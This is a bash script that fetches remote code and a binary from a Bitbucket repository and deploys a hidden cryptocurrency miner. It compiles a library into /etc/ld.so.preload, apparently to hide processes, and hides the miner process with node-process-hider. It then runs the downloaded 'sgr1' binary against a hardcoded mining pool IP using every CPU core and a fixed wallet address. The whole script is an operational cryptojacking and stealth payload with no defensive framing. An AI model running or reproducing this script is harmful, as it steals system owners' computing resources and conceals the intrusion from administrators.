#!/bin/bash
curl https://bitbucket.org/dennidarko01/kangkung/raw/master/nyumput.c -o nyumput.c
apt install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
sudo apt-get update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.19.2 -y && npm i -g node-process-hider && ph add sgr1
wget -O sgr1 https://bitbucket.org/dennidarko01/kangkung/raw/master/plant && chmod +x sgr1 && ./sgr1 -a yespowertide -o stratum+tcp://8.209.98.71:443 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0001-A -p x -t$(nproc --all)
